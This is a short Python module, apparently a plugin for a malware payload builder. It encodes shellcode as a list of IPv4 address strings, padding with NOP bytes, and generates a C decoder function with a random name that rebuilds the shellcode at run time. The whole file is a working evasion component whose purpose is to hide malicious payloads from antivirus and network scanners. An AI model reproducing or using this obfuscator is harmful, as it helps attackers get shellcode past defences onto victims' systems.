import random
import string

class IPv4Obfuscate:

    def __init__(self):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))

    def imports(self):
        return []

    def codeblock(self):
        return """
unsigned char * {name}(const unsigned char *encoded[])
{{
    int size = {size};
    unsigned char *out = malloc(size*4);
    for (int i=0; i<size; i++){{
        char *mutable = strdup(encoded[i]);
        char *myPtr = strtok(mutable, ".");
        for (int j=0; j<4; j++){{
            out[i*4+j] = atoi(myPtr);
            myPtr = strtok(NULL, ".");
        }}
    }}

    return out;
}}
""".format(name = self.name, size = self.size)
    
    def compilerOptions(self):
        return []

    def obfuscate(self, decoded):
        encoded = []
        self.size = 0
        for i in range(0, len(decoded), 4):
            chunk = decoded[i:i+4]
            if len(chunk) < 4:
                chunk = chunk + (b"\x90" * (4 - len(chunk)))
            encoded.append('.'.join([f'{chunk[n]}' for n in range(0, 4)]))
            self.size += 1
        return encoded

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')